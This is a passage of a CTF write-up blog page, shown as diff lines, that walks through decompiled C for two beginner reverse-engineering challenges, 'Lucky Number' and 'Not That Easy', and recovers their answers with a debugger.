\&#x27;_ \\ / _ \\ \&#x27;__| &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |___| |_| | (__|   &lt;| |_| | | |\\  | |_| | | | | | | |_) |  __/ |    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\\_____/\\__,_|\\___|_|\\_\\__, | \\_| \\_/\\__,_|_| |_| |_|_.__/ \\___|_|    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;                        __/ |                                         &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;                       |___/                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a number to check if its a lucky number: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00102280,&amp;input);</span><br><span class="line">  input = doSomething(input);</span><br><span class="line">  luckyNumberGen(&amp;expected);</span><br><span class="line">  <span class="keyword">if</span> (expected == input) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wow ! You guessed the lucky number.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now submit the lucky number to get your points&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Damn ! You are unlucky like me :( &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>user input is being stored in <strong>input</strong> variable </li>
+<li><code>doSomething</code> function being called with <strong>input</strong> as arg</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">doSomething</span><span class="params">(ulong param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ulong i;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = param_1; i != <span class="number">0</span>; i = i / <span class="number">10</span>) &#123;</span><br><span class="line">    local_10 = local_10 * <span class="number">10</span> + i % <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> local_10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>the purpose of this function is to reverse the digits of the input unsigned long integer param_1 and return the result as a long integer. For example, if the input is 123, the function will return 321.</p>
+<p>then <code>luckyNumberGen</code> function with <strong>expected</strong> variable as a arg, lets see</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luckyNumberGen</span><span class="params">(<span class="type">long</span> *param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  <span class="type">long</span> local_28;</span><br><span class="line">  <span class="type">long</span> local_20;</span><br><span class="line">  ulong i;</span><br><span class="line">  </span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">1</span>;</span><br><span class="line">  *param_1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    *param_1 = *param_1 + local_28;</span><br><span class="line">    lVar1 = local_20 + local_28;</span><br><span class="line">    local_28 = local_20;</span><br><span class="line">    local_20 = lVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>the purpose of this code is to generate the first 50 numbers of the Fibonacci sequence and store the sum of these numbers in the memory location pointed to by <code>param_1</code>. </p>
+<p>okay, lets see the output of this function</p>
+<p><img src="/imgs/post5/rev/luckynumFunc.png" alt="luckynumFunc.png"></p>
+<p>hmm got it, now we know our input have to go through <code>doSomething</code> function that reverse the user input.</p>
+<p>we can also see this in run time while debugging </p>
+<p><img src="/imgs/post5/rev/lucky_number.gif" alt="lucky_number.gif"></p>
+<p>it means we have to enter this number in reverse order</p>
+<p><img src="/imgs/post5/rev/lucky_number.png" alt="lucky_number.png"></p>
+<h3 id="Not-That-Easy"><a href="#Not-That-Easy" class="headerlink" title="Not That Easy"></a>Not That Easy</h3><p>this one was quite tricky i solved it after CTF</p>
+<h4 id="main-func-3"><a href="#main-func-3" class="headerlink" title="main func"></a>main func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_94;</span><br><span class="line">  undefined4 local_8d;</span><br><span class="line">  undefined2 local_89;</span><br><span class="line">  undefined4 local_87;</span><br><span class="line">  undefined3 uStack131;</span><br><span class="line">  undefined8 local_80;</span><br><span class="line">  undefined8 local_78;</span><br><span class="line">  undefined8 local_70;</span><br><span class="line">  undefined4 local_68;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined7 local_50;</span><br><span class="line">  undefined uStack73;</span><br><span class="line">  undefined7 uStack72;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined2 local_30;</span><br><span class="line">  undefined6 uStack46;</span><br><span class="line">  undefined2 uStack40;</span><br><span class="line">  undefined8 local_26;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_8d = <span class="number">0x756e654d</span>;</span><br><span class="line">  local_89 = <span class="number">0x3a</span>;</span><br><span class="line">  local_58 = <span class="number">0x6568746f4d202e31</span>;</span><br><span class="line">  local_50 = <span class="number">0x206472616f6272</span>;</span><br><span class="line">  uStack73 = <span class="number">0x56</span>;</span><br><span class="line">  uStack72 = <span class="number">0x6e6f69737265</span>;</span><br><span class="line">  local_87 = <span class="number">0x52202e32</span>;</span><br><span class="line">  uStack131 = <span class="number">0x4d41</span>;</span><br><span class="line">  local_78 = <span class="number">0x617265704f202e33</span>;</span><br><span class="line">  local_70 = <span class="number">0x73795320676e6974</span>;</span><br><span class="line">  local_68 = <span class="number">0x6d6574</span>;</span><br><span class="line">  local_80 = <span class="number">0x67616c46202e34</span>;</span><br><span class="line">  local_38 = <span class="number">0x6f79207265746e45</span>;</span><br><span class="line">  local_30 = <span class="number">0x7275</span>;</span><br><span class="line">  uStack46 = <span class="number">0x63696f686320</span>;</span><br><span class="line">  uStack40 = <span class="number">0x2065</span>;</span><br><span class="line">  local_26 = <span class="number">0x203a7d342d317b</span>;</span><br><span class="line">  banner(&amp;local_8d,&amp;local_58,&amp;local_87,&amp;local_78,&amp;local_80,&amp;local_38);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00102359,&amp;local_94);</span><br><span class="line">  <span class="keyword">if</span> (local_94 == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not that easy :P&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LAB_00101898;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_94 &lt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (local_94 == <span class="number">3</span>) &#123;</span><br><span class="line">      getOperatingSystem();</span><br><span class="line">      <span class="keyword">goto</span> LAB_00101898;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (local_94 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (local_94 == <span class="number">1</span>) &#123;</span><br><span class="line">        getMotherboardVersion();</span><br><span class="line">        <span class="keyword">goto</span> LAB_00101898;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (local_94 == <span class="number">2</span>) &#123;</span><br><span class="line">        getRAM();</span><br><span class="line">        <span class="keyword">goto</span> LAB_00101898;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">LAB_00101898:</span><br><span class="line">  <span class="keyword">if</span> (local_10 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>we don’t see any function that we should start reversing in <code>main</code> function as i ignored <code>banner</code> one thinking it should be used only for printing banner arts </p>
+<p>but as we can see it being called with some local variable argument that holds some hex value, if we see <code>banner</code> function </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>	</span><br><span class="line"> <span class="number">2</span>	<span class="type">void</span> <span class="title function_">banner</span><span class="params">(<span class="type">char</span> *param_1,<span class="type">char</span> *param_2,<span class="type">char</span> *param_3,<span class="type">char</span> *param_4,<span class="type">char</span> *param_5,<span class="type">long</span> param_6)</span></span><br><span class="line"> 3	</span><br><span class="line"> 4	&#123;</span><br><span class="line"> <span class="number">5</span>	  <span class="type">int</span> iVar1;</span><br><span class="line"> <span class="number">6</span>	  <span class="type">time_t</span> tVar2;</span><br><span class="line"> <span class="number">7</span>	  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line"> <span class="number">8</span>	  <span class="type">char</span> local_38 [<span class="number">4</span>];</span><br><span class="line"> <span class="number">9</span>	  undefined local_34;</span><br><span class="line"><span class="number">10</span>	  undefined local_33;</span><br><span class="line"><span class="number">11</span>	  undefined local_32;</span><br><span class="line"><span class="number">12</span>	  <span class="type">char</span> local_31;</span><br><span class="line"><span class="number">13</span>	  <span class="type">char</span> local_30;</span><br><span class="line"><span class="number">14</span>	  <span class="type">char</span> local_2f;</span><br><span class="line"><span class="number">15</span>	  undefined local_2e;</span><br><span class="line"><span class="number">16</span>	  <span class="type">char</span> local_2d;</span><br><span class="line"><span class="number">17</span>	  <span class="type">char</span> local_2c;</span><br><span class="line"><span class="number">18</span>	  <span class="type">char</span> local_2b;</span><br><span class="line"><span class="number">19</span>	  undefined local_2a;</span><br><span class="line"><span class="number">20</span>	  undefined local_29;</span><br><span class="line"><span class="number">21</span>	  <span class="type">char</span> local_28;</span><br><span class="line"><span class="number">22</span>	  <span class="type">char</span> local_27;</span><br><span class="line"><span class="number">23</span>	  undefined local_26;</span><br><span class="line"><span class="number">24</span>	  undefined local_25;</span><br><span class="line"><span class="number">25</span>	  <span class="type">long</span> local_10;</span><br><span class="line"><span class="number">26</span>	  </span><br><span class="line"><span class="number">27</span>	  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line"><span class="number">28</span>	  <span class="built_in">puts</span>(<span class="string">&quot;  _   _       _     _______ _           _     ______                &quot;</span>);</span><br><span class="line"><span class="number">29</span>	  <span class="built_in">puts</span>(<span class="string">&quot; | \\ | |     | |   |__   __| |         | |   |  ____|               &quot;</span>);</span><br><span class="line"><span class="number">30</span>	  <span class="built_in">puts</span>(<span class="string">&quot; |  \\| | ___ | |_     | |  | |__   __ _| |_  | |__   __ _ ___ _   _ &quot;</span>);</span><br><span class="line"><span class="number">31</span>	  <span class="built_in">puts</span>(<span class="string">&quot; | . ` |/ _ \\| __|    | |  | \&#x27;_ \\ / _` | __| |  __| / _` / __| | | |&quot;</span>);</span><br><span class="line"><span class="number">32</span>	  <span class="built_in">puts</span>(<span class="string">&quot; | |\\  | (_) | |_     | |  | | | | (_| | |_  | |___| (_| \\__ \\ |_| |&quot;</span>);</span><br><span class="line"><span class="number">33</span>	  <span class="built_in">puts</span>(<span class="string">&quot; |_| \\_|\\___/ \\__|    |_|  |_| |_|\\__,_|\\__| |______\\__,_|___/\\__, |&quot;</span>);</span><br><span class="line"><span class="number">34</span>	  <span class="built_in">puts</span>(<span class="string">&quot;                                                               __/ |&quot;</span>);</span><br><span class="line"><span class="number">35</span>	  <span class="built_in">puts</span>(<span class="string">&quot; A useless program developed by NomanProdhan                  |___/ &quot;</span>);</span><br><span class="line"><span class="number">36</span>	  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="number">37</span>	  <span class="built_in">puts</span>(param_1);</span><br><span class="line"><span class="number">38</span>	  <span class="built_in">puts</span>(param_2);</span><br><span class="line"><span class="number">39</span>	  local_2e = *(undefined *)(param_6 + <span class="number">1</span>);</span><br><span class="line"><span class="number">40</span>	  <span class="built_in">puts</span>(param_3);</span><br><span class="line"><span class="number">41</span>	  local_27 = local_2e;</span><br><span class="line"><span class="number">42</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">9</span>]);</span><br><span class="line"><span class="number">43</span>	  local_38[<span class="number">1</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">44</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">9</span>]);</span><br><span class="line"><span class="number">45</span>	  local_38[<span class="number">0</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">46</span>	  <span class="built_in">puts</span>(param_4);</span><br><span class="line"><span class="number">47</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">5</span>]);</span><br><span class="line"><span class="number">48</span>	  local_38[<span class="number">1</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">49</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_4[<span class="number">0xd</span>]);</span><br><span class="line"><span class="number">50</span>	  local_38[<span class="number">2</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">51</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">7</span>]);</span><br><span class="line"><span class="number">52</span>	  local_38[<span class="number">3</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">53</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)*(<span class="type">char</span> *)(param_6 + <span class="number">0xb</span>));</span><br><span class="line"><span class="number">54</span>	  local_34 = (undefined)iVar1;</span><br><span class="line"><span class="number">55</span>	  <span class="built_in">puts</span>(param_5);</span><br><span class="line"><span class="number">56</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)*(<span class="type">char</span> *)(param_6 + <span class="number">0x12</span>));</span><br><span class="line"><span class="number">57</span>	  local_33 = (undefined)iVar1;</span><br><span class="line"><span class="number">58</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_4[<span class="number">3</span>]);</span><br><span class="line"><span class="number">59</span>	  local_32 = (undefined)iVar1;</span><br><span class="line"><span class="number">60</span>	  local_31 = param_2[<span class="number">4</span>];</span><br><span class="line"><span class="number">61</span>	  local_29 = local_38[<span class="number">3</span>];</span><br><span class="line"><span class="number">62</span>	  local_30 = param_4[<span class="number">4</span>];</span><br><span class="line"><span class="number">63</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)*(<span class="type">char</span> *)(param_6 + <span class="number">0x16</span>));</span><br><span class="line"><span class="number">64</span>	  local_25 = (undefined)iVar1;</span><br><span class="line"><span class="number">65</span>	  local_2f = param_2[<span class="number">0x12</span>];</span><br><span class="line"><span class="number">66</span>	  local_2e = *(undefined *)(param_6 + <span class="number">0x14</span>);</span><br><span class="line"><span class="number">67</span>	  local_2d = *param_2;</span><br><span class="line"><span class="number">68</span>	  local_2c = param_4[<span class="number">8</span>];</span><br><span class="line"><span class="number">69</span>	  local_28 = param_3[<span class="number">4</span>];</span><br><span class="line"><span class="number">70</span>	  local_2b = param_4[<span class="number">0xd</span>];</span><br><span class="line"><span class="number">71</span>	  local_2a = local_2e;</span><br><span class="line"><span class="number">72</span>	  local_27 = local_2f;</span><br><span class="line"><span class="number">73</span>	  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">0xd</span>]);</span><br><span class="line"><span class="number">74</span>	  local_38[<span class="number">1</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">75</span>	  local_26 = *(undefined *)(param_6 + <span class="number">6</span>);</span><br><span class="line"><span class="number">76</span>	  tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line"><span class="number">77</span>	  srand((uint)tVar2);</span><br><span class="line"><span class="number">78</span>	  iVar1 = rand();</span><br><span class="line"><span class="number">79</span>	  <span class="built_in">printf</span>(<span class="string">&quot;Today\&#x27;s Lucky Number : %d\n&quot;</span>,(ulong)(uint)(local_38[iVar1 % <span class="number">0x13</span>] * <span class="number">2</span>));</span><br><span class="line"><span class="number">80</span>	  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,param_6);</span><br><span class="line"><span class="number">81</span>	  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line"><span class="number">82</span>	                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line"><span class="number">83</span>	    __stack_chk_fail();</span><br><span class="line"><span class="number">84</span>	  &#125;</span><br><span class="line"><span class="number">85</span>	  <span class="keyword">return</span>;</span><br><span class="line"><span class="number">86</span>	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>initially parameter’s value being passed to local variables thinking that these all should be pieces of flag i run the debugger and start looking for any interesting string and indeed i got the flag</p>
+<p><img src="/imgs/post5/rev/not_that_easy.png" alt="not_that_easy.png"></p>
+<p>in action </p>
+<p><img src="/imgs/post5/rev/not_that_easy.gif" alt="not_that_easy.gif"></p>
+<p>i’ll continue writing rest later 🥱</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archive">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ghost"><span class="toc-number">1.1.</span> <span class="toc-text">Ghost</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-func"><span class="toc-number">1.1.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#anyaForger"><span class="toc-number">1.3.</span> <span class="toc-text">anyaForger</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#vuln-func"><span class="toc-number">1.3.1.</span> <span class="toc-text">vuln func</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#callme"><span class="toc-number">1.5.</span> <span class="toc-text">callme</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-func-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">main func</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rev"><span class="toc-number">2.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lucky-Number"><span class="toc-number">2.1.</span> <span class="toc-text">Lucky Number</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-func-2"><span class="toc-number">2.1.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Not-That-Easy"><span class="toc-number">2.2.</span> <span class="toc-text">Not That Easy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-func-3"><span class="toc-number">2.2.1.</span> <span class="toc-text">main func</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&text=CTF WriteUp: BDSec 2023"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&is_video=false&description=CTF WriteUp: BDSec 2023"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF WriteUp: BDSec 2023&body=Check out this article: https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&name=CTF WriteUp: BDSec 2023&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&t=CTF WriteUp: BDSec 2023"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    Durgesh
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archive">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
